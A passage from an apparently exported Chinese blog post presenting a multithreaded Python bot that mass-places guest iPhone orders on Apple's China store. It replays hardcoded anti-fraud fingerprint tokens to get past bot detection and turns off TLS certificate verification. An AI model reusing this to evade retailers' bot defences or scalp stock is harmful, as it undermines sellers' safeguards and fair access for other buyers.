order['lastName'] = l[0]\n                order['firstName'] = l[1]\n                order['phone'] = l[2]\n                order['email'] = l[3]\n                order['state'] = l[4]\n                order['city'] = l[5]\n                order['district'] = l[6]\n                order['street'] = l[7]\n                order['payment'] = l[8]\n                order['product'] = l[9]\n                order['color'] = l[10]\n                order['capacity'] = l[11]\n                order['quantity'] = l[12]\n                logging.debug(order)\n                t=threading.Thread(target=self.buy,args=(order,))\n                thread_arr.append(t)\n\n        for t in range(len(thread_arr)):\n            thread_arr[t].start()       # 启动线程。         \n        \n        for t in range(len(thread_arr)):\n            thread_arr[t].join()        # 收拢\n        pass\n\n    # 处理购买\n    def buy(self,order):\n        retryTime = 5       # 请求失败后重试次数\n        retryTimeout = 30     # 全局超时时间\n        orderIdentify = order['lastName']+order['firstName']+\"<\"+order['product']+\"/\"+ order['color']+\"/\"+order['capacity']+\"> || \"\n        # n = 0         # 测试代码\n        # while n < 5:\n        #     print(threading.current_thread().name)\n        #     n = n + 1\n        #     time.sleep(1)\n        # return \n        userAgent=\"Mozilla/5.0 (Windows; U; Windows NT 6.1; zh-CN) AppleWebKit/533+ (KHTML, like Gecko)\"   # aywysya可能需要与此值匹配。\n        cookies={}\n        proxies={\n            \"http\": \"http://127.0.0.1:8080\",     # 本地监听\n            \"https\": \"https://127.0.0.1:8080\"\n        }\n        print('order :: '+order['lastName']+order['firstName']+\"\\t\"+order['email']+\"\\t%15s\\t%15s\\t%15s\"%(order['product'],order['capacity'],order['color']) )\n        time.sleep(0.5)\n        if order['product']==\"iphone8\" or order['product']=='iphone8plus':\n            url=\"https://www.apple.com/cn/shop/buy-iphone/iphone-8\"\n        elif order['product']=='iphonex':\n            #if datetime.datetime.now().timestamp() < datetime.datetime(2017,10,27,15,0).timestamp():    #从时间判断是否起售\n            tmp= datetime.datetime(2017,10,27,6,58).timestamp()-time.timezone - datetime.datetime.now().timestamp()\n            if tmp>0:  # UTC时间！   \n                print(orderIdentify+\"🤕\\tiphone X 尚未起售！ == %d minutes ==\"%(tmp/60))\n                return\n            else:\n                url=\"https://www.apple.com/cn/shop/buy-iphone/iphone-x\"\n\n        session=requests.session()      # session会话可以自动保存和处理cookie\n        session.proxies=proxies\n        session.verify=False\n        session.timeout=30          # 此处设置timeout无用\n        session.headers={'User-Agent':userAgent}\n        # https://stackoverflow.com/questions/15431044/can-i-set-max-retries-for-requests-request/\n        session.mount('https://', requests.adapters.HTTPAdapter(max_retries=retryTime-1))     # 实际会重试 max_retries +1 次   所以将retry次数先减1\n        session.mount('http://', requests.adapters.HTTPAdapter(max_retries=retryTime-1))\n\n\n        # logging.debug(\"GET请求 :: %s\"%url)\n        #r = session.get(url,timeout=reqTimeout)\n        # logging.info(\"获得cookie :: %s\"%print(r.cookies)[:80])\n\n        # 在products.json中遍历对应产品,PS:从网页获取比较麻烦。\n        if not os.path.exists(os.path.join(os.path.split(os.path.abspath(__file__))[0],\"products.json\")):\n            print(\"\\n\\t\\tproducts.json文件不存在！\\n\")\n            sys.exit(0)\n        currentProduct={}\n        with open(os.path.join(os.path.split(os.path.abspath(__file__))[0],\"products.json\"),encoding='utf-8') as productFileHandle:    \n            products = json.load(productFileHandle)\n            for p in products:\n                #pdb.set_trace()\n                if p['productLocatorFamily']==order['product'] and p['dimensionCapacity']==order['capacity'] and p['dimensionColor']==order['color']:\n                    logging.debug(\"产品型号 : %s\\t%s\"%(p['partNumber'],p['seoUrlToken'])[:80])\n                    currentProduct=p\n                    break   # 找到相应产品，退出for循环\n            if len(currentProduct) == 0:\n                print(\"未找到相应产品\\t%s\\t%s\\t%s\"%(order['product'],order['capacity'],order['color']) )\n                return\n            # close products.json\n        try:\n        #if True:\n            # 验证是否启售\n            while True:\n\n                # 重试方式，但太复杂，且用修饰器也并不好实现。\n                # n = 0\n                # while n<retryTime:\n                #     try:\n                #         r=session.get(\"https://www.apple.com/cn/shop/delivery-message?parts.0=\"+currentProduct['partNumber'],timeout=reqTimeout)\n                #         n = n + 10000       # 请求成功，跳出循环\n                #     except Exception as e:\n                #         n = n + 1\n                #         if n>=retryTime:\n                #         print(\"重试次数过多！！！ <退出>\")\n                #         return\n                # end while\n                order['remark']='出师未捷 :: '+\"https://www.apple.com/cn/shop/delivery-message?parts.0=\"+currentProduct['partNumber']\n                logging.debug(\"\\n%s\\n\"%currentProduct)\n                r=session.get(\"https://www.apple.com/cn/shop/delivery-message?parts.0=\"+currentProduct['partNumber'],timeout=retryTimeout)\n                logging.debug(r.text)\n                deliveryMsg = json.loads(r.text,encoding='utf-8')\n                #print(orderIdentify+\"%s  %s\"%(deliveryMsg['body']['content']['deliveryMessage'][currentProduct['partNumber']]['orderByDeliveryBy'],deliveryMsg['body']['content']['deliveryMessage'][currentProduct['partNumber']]['deliveryOptionMessages']))\n\n                if '未发售' in deliveryMsg['body']['content']['deliveryMessage'][currentProduct['partNumber']]['deliveryOptionMessages'][0] :\n                    print(orderIdentify+currentProduct['seoUrlToken']+\" || 暂未发售\")\n                    time.sleep(3)   # 隔三秒钟\n                else:\n                    print(orderIdentify+deliveryMsg['body']['content']['deliveryMessage'][currentProduct['partNumber']]['orderByDeliveryBy']+deliveryMsg['body']['content']['deliveryMessage'][currentProduct['partNumber']]['deliveryOptionMessages'][0])\n                    break       # 起售！！！   跳出while死循环\n\n            # 添加购物车\n            addCartUrl=url+\"/\"+currentProduct['seoUrlToken']+\"?product=\"+currentProduct['partNumber']    \\\n                        +\"&purchaseOption=fullPrice\"                                    \\\n                        +\"&step=select\"                                                 \\\n                        +\"&dimensionCapacity=\"+currentProduct['dimensionCapacity']      \\\n                        +\"&dimensionColor=\"+currentProduct['dimensionColor']            \\\n                        +\"&part=\"+currentProduct['part']                                \\\n                        +\"&complete=true\"                                               \\\n                        +\"&dimensionScreensize=\"+currentProduct['dimensionScreensize']  \\\n                        +\"&add-to-cart=add-to-cart\"\n            print(orderIdentify+\"添加到购物车[GET] :: %s\"%addCartUrl[:80])\n            r = session.get(addCartUrl,timeout=retryTimeout)\n            \n            #pdb.set_trace()\n            # 访问购物车\n            shopBagUrl=\"https://www.apple.com/cn/shop/bag\"\n            print(orderIdentify+\"访问购物车[GET] :: %s\"%shopBagUrl[:80])\n            order['remark']=\"[失败]访问购物车 :: %s\"%shopBagUrl\n            r = session.get(shopBagUrl,timeout=retryTimeout)\n            \n            token=re.search(r'\\\"x-aos-stk\\\":\\\"(.*?)\\\"',r.text).group(1)\n            # requests.utils.add_dict_to_cookiejar(session.cookies,{\"x-aos-stk\":token})   # 此语句是将token添加到cookie.\n\n            # 修改数量  可修改为2      此处cookie中需要携带x-aos-stk，应该类似于token的作用。    # 应该可以省略！！！！！ 在结账步骤可一同实现。\n            # tmp=re.search(r'\"updateQuantity\":{\"url\":\"(/cn/shop/bagx\\?_a=updateQuantity&_m=(shoppingCart.items.item-.*?))\"',r.text)\n            # updateQuantityUrl=\"https://www.apple.com\"+tmp.group(1)\n            # if order['quantity']=='2':\n            #     r= session.post(updateQuantityUrl,data={tmp.group(2)+\".quantity\":\"2\"},headers={\"x-aos-stk\":token},timeout=reqTimeout)\n                \n            #     #pdb.set_trace()\n            #     print()\n            \n            # 结账\n            tmp=re.search(r'\\\"updateQuantity\\\":{\\\"url\\\":\\\"(/cn/shop/bagx\\?_a=updateQuantity&_m=(shoppingCart.items.item-.*?))\\\"',r.text)\n            checkoutUrl=\"https://www.apple.com/cn/shop/bagx/checkout_now?_a=checkout&_m=shoppingCart\"\n            print(orderIdentify+\"结账[POST] :: %s\"%checkoutUrl[:80])\n            order['remark']=\"[失败]结账[POST] :: %s\"%checkoutUrl\n            r= session.post(checkoutUrl,data={tmp.group(2)+\".quantity\":order['quantity'],'shoppingCart.actions.fcscounter':'NaN','shoppingCart.actions.fcsdata':''},headers={\"x-aos-stk\":token},timeout=retryTimeout)\n            \n            #pdb.set_trace()\n            signinUrl=json.loads(r.text,encoding='utf-8')['head']['data']['url']\n            print(orderIdentify+\"登录页面[GET] :: %s\"%signinUrl[:80])\n\n            order['remark']=\"[失败]登录页面[GET] :: %s\"%signinUrl\n            r=session.get(signinUrl,timeout=retryTimeout)\n            \n            guestBuyData=re.search(r'\\\"signInGuest\\\":\\{\\\"form\\\":\\\"login\\._forms\\.guestCheckoutForm\\\",\\\"url\\\":\\\"/cn/shop/sentryx/sign_in\\?(_a=login\\.guestSign.*?)\\\"',r.text).group(1)\n            \n            tmp = re.findall(r'(.*?=.*?)&',guestBuyData+\"&\")\n            data={}\n            for i in tmp:\n                data[i.split(\"=\",maxsplit=1)[0]]=i.split(\"=\",maxsplit=1)[1]\n            \n            # 两个复杂参数，硬编码！  \n            data['aywysya']='78a44j1d7lY5BNvcKyAdMUDFBpBeA0fUm7qKFz0XnjYrJFW73AuyPBB2SCVMvsD7z5meTuCUMz_WgpMVQdgGgeVjrkRGjftckcKyAd65hz74WySXvO3wa3wL6tqAhbrmQkLNbfyz.sU7zl998tp7ppeZLz77qZoOSix5ezdstlYrMxy0kyMpwoNLTK9Ly9nOVlQtb_GGEOpBSKxUC56MnGWpwoNSUC53ZXnN87gq1aWuxXVvHe9FjpidPNs0ojpVMZ90L5H6fqUdHz15tTma1eWNieLqDxpHrk0ugN.xL438IXkb9CxN4t1VKWZWudUd.z9euVrAqJkJgghmeugN.VHBQLz4mvmfTT9oaSumKkpjlRiwerbXh8bUudQUhkY5BSmmY5BNkOdhs7GY6Mk.BY8'\n            data['fdcBrowserData']='%257B%2522U%2522%253A%2522Mozilla%252F5.0%2520(Windows%253B%2520U%253B%2520Windows%2520NT%25206.1%253B%2520zh-CN)%2520AppleWebKit%252F533%252B%2520(KHTML%252C%2520like%2520Gecko)%2522%252C%2522L%2522%253A%2522zh-CN%2522%252C%2522Z%2522%253A%2522GMT%252B08%253A00%2522%252C%2522V%2522%253A%25221.0%2522%257D'\n            tmpUrl = re.search(r'(https:\\/\\/secure.?\\.store\\.apple\\.com)\\/cn\\/shop\\/',r.text).group(1)+'/cn/shop/sentryx/sign_in'\n            logging.debug(\"访客结账[POST] :: %s\"%tmpUrl)\n            order['remark']=\"[失败]访客结账[POST] :: %s\"%tmpUrl\n            r = session.post(tmpUrl,data=data,timeout=retryTimeout)\n            \n            pltn = json.loads(r.text,encoding='utf-8')['head']['data']['args']['pltn']\n            checkoutStartUrl = json.loads(r.text,encoding='utf-8')['head']['data']['url']\n\n            logging.debug(\"结账跳转-1 [POST] :: %s\"%checkoutStartUrl)\n            order['remark']=\"[失败]结账跳转-1 [POST] :: %s\"%checkoutStartUrl\n            r = session.post(checkoutStartUrl,data={'pltn':pltn},timeout=retryTimeout)\n            \n            data={}\n            checkoutUrl = re.search(r'<form method=\\\"POST\\\" name=\\\"redirector\\\" action=\\\"(https://.*?)\\\"',r.text).group(1)\n            data['pltn'] = re.search(r'<input name=\"pltn\" type=\"\\w*?\" value=\"(.*?)\"',r.text).group(1)\n            data['v'] = re.search(r'<input name=\"v\" type=\"\\w*?\" value=\"(.*?)\"',r.text).group(1)\n            data['sessionID'] = re.search(r'<input name=\"sessionID\" type=\"\\w*?\" value=\"(.*?)\"',r.text).group(1)\n            logging.debug(\"结账跳转-2 [POST] :: %s\"%checkoutUrl)\n            order['remark']=\"[失败]结账跳转-2 [POST] :: %s\"%checkoutUrl\n            r = session.post(checkoutUrl,data=data,timeout=retryTimeout)\n            \n            # 送货选项 --> 送货地址\n            data={}\n            data['sessionID']=re.search(r'\\{\\\"name\\\":\\\"sessionID\\\",\\\"value\\\":\\\"(.*?)\\\"\\}',r.text).group(1)\n            # data['A8']=re.search(r',\"deliveryLocationType\":\"(.*?)\",\"_forms\":{\"main\":{\"fields\":\\[{\"id\":\"(cart-item-.*?deliveryLocationType)\",',r.text).group(1)\n            # data['cartItem']=re.search(r',\"deliveryLocationType\":\"(.*?)\",\"_forms\":{\"main\":{\"fields\":\\[{\"id\":\"(cart-item-.*?deliveryLocationType)\",',r.text).group(2)\n            #data[re.search(r'\\\"id\\\":\\\"(cart-item-.*?deliveryLocationType)\\\",',r.text).group(1)]='A8'   # 2017-10-26发现该正则表达式存在匹配问题,匹配了超长的字符串\n            data[re.search(r'(cart-item-([0-9A-z]+-){5}delivery-deliveryLocationType)',r.text).group(1)]='A8'\n            \n            data['_a']='cart.cont'\n            data['_fid']='co'\n            data['_m']='cart'\n            # 有多台secure主机，需要从页面取值。\n            checkoutxUrl = re.search(r'(https:\\/\\/secure.?\\.store\\.apple\\.com)\\/cn\\/shop\\/',r.text).group(1)+'/cn/shop/checkoutx'\n            print(orderIdentify+\"送货选项 --> 送货地址[POST] :: %s\"%checkoutxUrl[:80])\n            order['remark']=\"[失败]送货选项 --> 送货地址[POST] :: %s\"%checkoutxUrl\n            r = session.post(checkoutxUrl,data=data,timeout=retryTimeout)\n            \n            # 送货地址 --> 付款\n            data={}\n            data['sessionID'] = re.search(r'\\{\\\"name\\\":\\\"sessionID\\\",\\\"value\\\":\\\"(.*?)\\\"\\}',r.text).group(1)\n            data['shipping-user-lastName'] = order['lastName']\n            data['shipping-user-firstName'] = order['firstName']\n            data['shipping-user-daytimePhoneAreaCode'] = '0'\n            data['shipping-user-daytimePhone'] = order['phone']\n            data['shipping-user-state'] = order['state']\n            data['shipping-user-city'] = order['city']\n            data['shipping-user-district'] = order['district']\n            data['shipping-user-street'] = order['street']\n            data['shipping-user-street2'] = ''\n            data['shipping-user-postalCode'] = ''\n            data['shipping-user-emailAddress'] = order['email']\n            data['shipping-user-mobilePhone'] = order['phone']\n            data['state'] = order['state']\n            data['keyPath'] = 'shipping.address'\n            data['city'] = order['city']\n            data['_a'] = 'ship.cont'\n            data['_fid'] = 'co'\n\n            print(orderIdentify+\"送货地址 --> 付款[POST] :: %s\"%checkoutxUrl[:80])\n            order['remark']=\"[失败]送货地址 --> 付款[POST] :: %s\"%checkoutxUrl\n            r = session.post(checkoutxUrl,data=data,timeout=retryTimeout)\n            \n            # 付款 --> 发票\n            data={}\n            data['sessionID'] = re.search(r'\\{\\\"name\\\":\\\"sessionID\\\",\\\"value\\\":\\\"(.*?)\\\"\\}',r.text).group(1)\n            data['undefined'] = ''\n            data['bankOption'] = 'Alipay'\n            data['_a'] = 'bill.cont'\n            data['_fid'] = 'co'\n\n            print(orderIdentify+\"付款 --> 发票[POST] :: %s\"%checkoutxUrl[:80])\n            order['remark']=\"[失败]付款 --> 发票[POST] :: %s\"%checkoutxUrl\n            r = session.post(checkoutxUrl,data=data,timeout=retryTimeout)\n            \n            # 发票 --> 账户\n            data={}\n            data['invoice-user-invoiceEmailAddress-emailAddress'] = order['email']\n            data['invoice-fapiao-invoiceHeader'] = order['lastName']+order['firstName']\n            data['invoice-fapiao-taxPayerId'] = ''\n            data['invoice-form-options-selection'] = 'personal'\n            data['sessionID'] = re.search(r'\\{\\\"name\\\":\\\"sessionID\\\",\\\"value\\\":\\\"(.*?)\\\"\\}',r.text).group(1)\n            data['invoice-user-invoiceDeliveryAddress-lastName'] = order['lastName']\n            data['invoice-user-invoiceDeliveryAddress-firstName'] = order['firstName']\n            data['invoice-user-invoiceDeliveryAddress-daytimePhoneAreaCode'] = '0'\n            data['invoice-user-invoiceDeliveryAddress-daytimePhone'] = order['phone']\n            data['invoice-user-invoiceDeliveryAddress-companyName'] = ''\n            data['invoice-user-invoiceDeliveryAddress-state'] = order['state']\n            data['invoice-user-invoiceDeliveryAddress-city'] = order['city']\n            data['invoice-user-invoiceDeliveryAddress-district'] = order['district']\n            data['invoice-user-invoiceDeliveryAddress-street'] = order['street']\n            data['invoice-user-invoiceDeliveryAddress-street2'] = ''\n            data['invoice-user-invoiceDeliveryAddress-postalCode'] = ''\n            data['state'] = order['state']\n            data['keyPath'] = 'invoice.invoiceDeliveryAddress'\n            data['city'] = order['city']\n            data['_a'] = 'invoice.cont'\n            data['_fid'] = 'co'\n\n            print(orderIdentify+\"发票 --> 账户[POST] :: %s\"%checkoutxUrl[:80])\n            order['remark']=\"[失败]发票 --> 账户[POST] :: %s\"%checkoutxUrl\n            r = session.post(checkoutxUrl,data=data,timeout=retryTimeout)\n            \n            # 账户 --> 条款与条件\n            data = {}\n            data['account-appleId'] = ''\n            data['account-password'] = ''\n            data['account-passwordAgain'] = ''\n            data['account-commsPref'] = 'false'\n            data['_a'] = 'acct.cont'\n            data['_fid'] = 'co'\n\n            print(orderIdentify+\"账户 --> 条款与条件[POST] :: %s\"%checkoutxUrl[:80])\n            order['remark']=\"[失败]账户 --> 条款与条件[POST] :: %s\"%checkoutxUrl\n            r = session.post(checkoutxUrl,data=data,timeout=retryTimeout)\n            # 同意 条款与条件\n            data = {}\n            data['sessionID'] = re.search(r'\\{\\\"name\\\":\\\"sessionID\\\",\\\"value\\\":\\\"(.*?)\\\"\\}',r.text).group(1)\n            data['accept'] = 'true'\n            data['acceptAppleTnc'] = 'false'\n            data['_a'] = 'terms.cont'\n            data['_fid'] = 'co'\n\n            print(orderIdentify+\"同意 条款与条件[POST] :: %s\"%checkoutxUrl[:80])\n            order['remark']=\"[失败]同意 条款与条件[POST] :: %s\"%checkoutxUrl\n            r = session.post(checkoutxUrl,data=data,timeout=retryTimeout)\n            \n            # 下订单\n            data={}\n            data['aywysya'] = 'F8a44j1d7lY5BNvcKyAdMUDFBpBeA0fUm7qKFz0XnjYrJFW73AuyPBB2SCVMvsD7z5meTuCUMz_WgpMVQdgGgeVjrkRGjftckcKyAd65hz74WySXvO3wa3wL6tqAhbrmQkLNbfyz.sU7zl998tp7ppeZLz77qZoOSix5ezdstlYrMxy0kyMpwoNLTK9Ly8nOVlQtb_GGEOpBSKxUC56MnGWpwoNSUC53ZXnN87gq1aWux_5ukV_AAUfSHolk2dUf.j7J1gBZEMgzH_y3Cmx_B4K1lSJhgSv_KU.6elV2pNJF_DA1RcrpVMZ90L5H6e0z1_yc4p0iMgdVdOOQ_KpNk0.ZNqhyA_r_LwwKdBvpZfWfUXtStKjE4PIDzpHqzQW5BNv__5BNlVnIQkFY5DjV.4v2'\n            data['sessionID'] = re.search(r'\\{\\\"name\\\":\\\"sessionID\\\",\\\"value\\\":\\\"(.*?)\\\"\\}',r.text).group(1)\n            data['promo-code'] = ''\n            data['_a'] = 'po'\n            data['_fid'] = 'co'\n\n\n            print(orderIdentify+\"下订单[POST] :: %s\"%checkoutxUrl[:80])\n            order['remark']=\"[存疑]下订单[POST] :: %s\"%checkoutxUrl\n            r = session.post(checkoutxUrl,data=data,timeout=retryTimeout*2)       # 此处timeout时间加倍\n            \n            # 订单状态\n            \n            #checkoutStatusUrl = re.search(r'(https:\\/\\/.*?\\.apple\\.com)',checkoutxUrl).group(1)+json.loads(r.text,encoding='utf-8')['head']['data']['url']  \n            checkoutStatusUrl = re.search(r'(https:\\/\\/.*?\\.apple\\.com)',r.url).group(1)+re.search(r'\\\"url\\\":\\\"(.*?)\\\"',r.text).group(1)\n            order['remark']=\"[存疑]订单状态-0 :: %s\"%tmpUrl\n            r = session.get(checkoutStatusUrl,timeout=retryTimeout)\n\n            data={}\n            data['_a']='status'\n            data['_fid']='co'\n            data['_m']='commo'\n            tmpUrl = re.search(r'(https:\\/\\/secure.?\\.store\\.apple\\.com)\\/cn\\/shop\\/',r.text).group(1)+'/cn/shop/checkoutx/status'\n\n            order['remark']=\"[存疑]订单状态-1 :: %s\"%tmpUrl\n        \n            r = session.post(tmpUrl,data=data,timeout=retryTimeout)\n\n            #tmpUrl = json.loads(r.text,encoding='utf-8')['head']['data']['url']   # 错误\n            tmpUrl = re.search(r'(https:\\/\\/.*?\\.apple\\.com)',r.url).group(1)+re.search(r'\\\"url\\\":\\\"(.*?)\\\"',r.text).group(1)\n            print(orderIdentify+\"订单状态 :: %s\"%tmpUrl[:80])\n            order['remark']=\"[存疑]订单状态-2 :: %s\"%tmpUrl\n            r = session.get(tmpUrl,timeout=retryTimeout)\n\n            # tmpUrl=json.loads(r.text,encoding='utf-8')['head']['data']['url'] #报错\n            tmpUrl = re.search(r'(https:\\/\\/.*?\\.apple\\.com)',r.url).group(1)+re.search(r'\\\"url\\\":\\\"(.*?)\\\"',r.text).group(1)\n\n            order['remark']=\"[存疑]谢谢 :: %s\"%tmpUrl\n            r = session.get(tmpUrl,timeout=retryTimeout)\n            \n            orderID = re.search(r',\\\"orderNumber\\\":\\\"(.*?)\\\",',r.text).group(1)\n            order['orderID'] = orderID\n            order['orderUrl']=\"https://store.apple.com/xc/cn/vieworder/\"+orderID+\"/\"+order['email']+\"/\"\n            order['remark']='成功'\n            \n            msg=order['lastName']+\t\t\\\n            order['firstName']+\"\\t\"+\t\t\\\n            order['product']+\"\\t\"+\t\t\\\n            order['color']+\"\\t\"+\t\t    \\\n            order['capacity']+\"\\t\"+\t\t\\\n            order['orderUrl']\n            print(\" 🍻🍻🍻🍻🍻 \\t\\t%s\"%msg)\n            self.orderResult(order,True)\n\n        except Exception as e:\n            order['orderID'] = ''\n            order['orderUrl'] = ''\n            self.orderResult(order,False)  # 购买失败！\n        # json订单格式使用！\n        # tmp = order['fileFullName']\n        # filePath,fileName = os.path.split(tmp)\n        # newFileName= \"done_\"+order['lastName']+order['firstName']+\"_\"+orderID+\"_\"+order['email']+fileName\n        # logging.info(\"修改订单文件 :: %s --> %s\"%(fileName,newFileName)[:80])\n        # os.rename(tmp,os.path.join(filePath,newFileName))\n\n    def orderResult(self,order,success):\n        msg=order['lastName']+\",\"+\t\t\\\n            order['firstName']+\",\"+\t\t\\\n            order['phone']+\",\"+\t\t    \\\n            order['email']+\",\"+\t\t    \\\n            order['state']+\",\"+\t\t    \\\n            order['city']+\",\"+\t\t    \\\n            order['district']+\",\"+\t\t\\\n            order['street']+\",\"+\t\t\\\n            order['payment']+\",\"+\t\t\\\n            order['product']+\",\"+\t\t\\\n            order['color']+\",\"+\t\t    \\\n            order['capacity']+\",\"+\t\t\\\n            order['quantity']+\",\"+\t\t\\\n            order['orderID']+\",\"+\t\t\\\n            order['orderUrl']+\",\"+      \\\n            order['remark']+\"\\n\"\n        self.threadLock.acquire()\n        with open(orderResult,'a+',encoding='utf-8') as fp:\n            fp.writelines(msg)\n        self.threadLock.release()\n# 参数处理\ndef main():\n    headCharPic=\"\\r        .--.\\n       |o_o |    ------------------ \\n       |:_/ |   < Author: Mr.Bingo >\\n      //   \\ \\   ------------------ \\n     (|     | ) <    oddboy.cn     >\\n    /'\\_   _/`\\  ------------------\\n    \\___)=(___/\\n\"\n    print(headCharPic)\n    # Creating a parser\n    buyer=iPhoneBuyer()\n    buyer.run_Threads()\n\nif __name__ == '__main__':\n    main()\n\n```","source":"_posts/iPhoneX抢购Python脚本.md","raw":"---\ntitle: iPhoneX抢购Python脚本\ndate: 2017-10-31 15:34:19\ntags: python\n---\n\n## 叨逼叨\n原本以为iPhone X会被疯抢，所谓八仙过海各显神通，我就想着用自己的野路子看看凑效不？\n\n经过几天的流程梳理，代码编写及优化，在27号前夕以iPhone 8作为测试，效果是灰常的好！\n<!--more-->\n![](iPhoneX抢购Python脚本/image01.jpg)\n\n批量下单(iphone8/8p),跑了40个订单,每个订单一条线程，20秒左右全部订单成功，邮箱也瞬间收到几十封邮件：\n\n![](iPhoneX抢购Python脚本/image02.png)\n\n## 失落的转折\n27日早上开始，苹果官网下单功能维护，直到下午三点功能才正常。 不过，在购物车跳转到支付页面的相关参数被改动了。所以，gg了！\n\n![](iPhoneX抢购Python脚本/image03.png)\n\n## 记录总结一下 | 付出总会有收获\n\n几天过去了，今天回过头来稍微整理下，记录下来，好歹也付出过不是？\n\n今天再次查看苹果网站，之前修改的参数点现在又修改回去了。不过在最后的下订单环节应该有增加了一些防护，所以我的脚本还是不能用。\n\n-----\n- python可以直接读取json文件转换为dict.非常好用！\n- 用datetime库来判断时间点：\n    ```python\n    tmp= datetime.datetime(2017,10,27,6,58).timestamp()-time.timezone - datetime.datetime.now().timestamp()\n    if tmp>0:  # UTC时间！   \n        print(orderIdentify+\"🤕\\tiphone X 尚未起售！ == %d minutes ==\"%(tmp/60))\n        return```\n- 使用requests.session类来处理多步骤的请求，可以自动处理cookie问题，自动重试功能也非常赞！\n    ```python\n    session=requests.session()      # session会话可以自动保存和处理cookie\n    session.proxies=proxies\n    session.verify=False\n    session.timeout=30          # 此处设置timeout无用\n    session.headers={'User-Agent':userAgent}\n    # https://stackoverflow.com/questions/15431044/can-i-set-max-retries-for-requests-request/\n    session.mount('https://', requests.adapters.HTTPAdapter(max_retries=retryTime-1))     # 实际会重试 max_retries +1 次   所以将retry次数先减1\n    session.mount('http://', requests.adapters.HTTPAdapter(max_retries=retryTime-1))\n    ```\n- 也许直接使用浏览器模拟器是更好的选择（如mechanize selenium），虽然“重”了些，但简单易处理。\n\n## 上代码 | 感兴趣的拿走不谢\n```python\n#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n# Author : Mr.Bingo\n# Version : 2.0\n# Description : \n\nimport pdb\nimport requests\nimport logging\nimport json\nimport sys\nimport os\nimport re\nimport threading\nimport datetime,time\nfrom requests.packages.urllib3.exceptions import InsecureRequestWarning\n\nrequests.packages.urllib3.disable_warnings(InsecureRequestWarning)\n\nlogging.basicConfig(level=logging.INFO)\n\n\n#orderPath= os.path.join(os.path.split(os.path.abspath(__file__))[0],u'order')     # json文件格式订单\norderFile= os.path.join(os.path.split(os.path.abspath(__file__))[0],'order.txt')    # txt订单格式\n#   lastName | firstName | phone | email | state | city | district | street | payment | product | color | capacity | quantity\n#   邓 | 六 | 15000555000 | test3@oddboy.cn | 北京 | 北京 | 海淀区 | XXX路17号 | Alipay | iphone8 | glod | 256gb | 2\norderResult = os.path.join(os.path.split(os.path.abspath(__file__))[0],'order-Result.csv')  # 成功订单\n\n# orderSuccess = os.path.join(os.path.split(os.path.abspath(__file__))[0],'order-Success.txt')  # 成功订单\n# orderFail = os.path.join(os.path.split(os.path.abspath(__file__))[0],'order-Fail.txt')  # 失败订单\n\nclass iPhoneBuyer(object):\n    # 初始化\n    def __init__(self):\n        self.dispData=[]    # list\n        self.threadLock = threading.Lock()  # 进程锁，主要用于写文件！\n        pass\n\n    # 多线程情况下美化，格式化输出消息。\n    def display(self):\n        pass\n\n    # 开启多线程 一个订单一个线程\n    def run_Threads(self):\n        thread_arr=[]       # 线程列表\n        threading.Thread(target=self.display)     \n\n        # json文件格式订单读取\n        # logging.info(\"\\r[info] Order Path : %s \"%orderPath[:80])\n        # for dirpath,dirname,files in os.walk(orderPath):\n        #     print(files)\n        #     for f in files:\n        #         if re.match(r'^order.*\\.json$',f):\n        #             f=os.path.join(orderPath,f)\n        #             logging.info(f)\n        #             with open(f,encoding='utf-8') as fp:\n        #                 order=json.load(fp)\n        #                 order['fileFullName']= f\n        #                 logging.debug(order)\n        #                 print(\"\\n> order's phone :: \"+order['phone'])\n        #                 #pdb.set_trace()\n        #                 t=threading.Thread(target=self.buy,args=(order,))\n        #                 thread_arr.append(t)\n\n        if not os.path.exists(orderFile):\n            print(\"没有订单文件！！！\")\n            sys.exit(0)\n        \n        with open(orderFile,encoding='utf-8') as fp:\n            raw_orders = fp.readlines()\n            tmp = False\n            for raw_order in raw_orders:\n                if not tmp:\n                    tmp =True\n                    continue    # 跳过order.txt文件的第一行\n              \n                raw_order = str(raw_order).replace(' ','')  # 删除所有空格\n                logging.debug(raw_order)\n                if not re.match(r'^((.*?\\|){13})',raw_order):      # 简单检查订单格式\n                    continue\n                l = raw_order.split(\"|\")\n                order={}\n                order['lastName'] = l[0]\n                order['firstName'] = l[1]\n                order['phone'] = l[2]\n                order['email'] = l[3]\n                order['state'] = l[4]\n                order['city'] = l[5]\n                order['district'] = l[6]\n                order['street'] = l[7]\n                order['payment'] = l[8]\n                order['product'] = l[9]\n                order['color'] = l[10]\n                order['capacity'] = l[11]\n                order['quantity'] = l[12]\n                logging.debug(order)\n                t=threading.Thread(target=self.buy,args=(order,))\n                thread_arr.append(t)\n\n        for t in range(len(thread_arr)):\n            thread_arr[t].start()       # 启动线程。         \n        \n        for t in range(len(thread_arr)):\n            thread_arr[t].join()        # 收拢\n        pass\n\n    # 处理购买\n    def buy(self,order):\n        retryTime = 5       # 请求失败后重试次数\n        retryTimeout = 30     # 全局超时时间\n        orderIdentify = order['lastName']+order['firstName']+\"<\"+order['product']+\"/\"+ order['color']+\"/\"+order['capacity']+\"> || \"\n        # n = 0         # 测试代码\n        # while n < 5:\n        #     print(threading.current_thread().name)\n        #     n = n + 1\n        #     time.sleep(1)\n        # return \n        userAgent=\"Mozilla/5.0 (Windows; U; Windows NT 6.1; zh-CN) AppleWebKit/533+ (KHTML, like Gecko)\"   # aywysya可能需要与此值匹配。\n        cookies={}\n        proxies={\n            \"http\": \"http://127.0.0.1:8080\",     # 本地监听\n            \"https\": \"https://127.0.0.1:8080\"\n        }\n        print('order :: '+order['lastName']+order['firstName']+\"\\t\"+order['email']+\"\\t%15s\\t%15s\\t%15s\"%(order['product'],order['capacity'],order['color']) )\n        time.sleep(0.5)\n        if order['product']==\"iphone8\" or order['product']=='iphone8plus':\n            url=\"https://www.apple.com/cn/shop/buy-iphone/iphone-8\"\n        elif order['product']=='iphonex':\n            #if datetime.datetime.now().timestamp() < datetime.datetime(2017,10,27,15,0).timestamp():    #从时间判断是否起售\n            tmp= datetime.datetime(2017,10,27,6,58).timestamp()-time.timezone - datetime.datetime.now().timestamp()\n            if tmp>0:  # UTC时间！   \n                print(orderIdentify+\"🤕\\tiphone X 尚未起售！ == %d minutes ==\"%(tmp/60))\n                return\n            else:\n                url=\"https://www.apple.com/cn/shop/buy-iphone/iphone-x\"\n\n        session=requests.session()      # session会话可以自动保存和处理cookie\n        session.proxies=proxies\n        session.verify=False\n        session.timeout=30          # 此处设置timeout无用\n        session.headers={'User-Agent':userAgent}\n        # 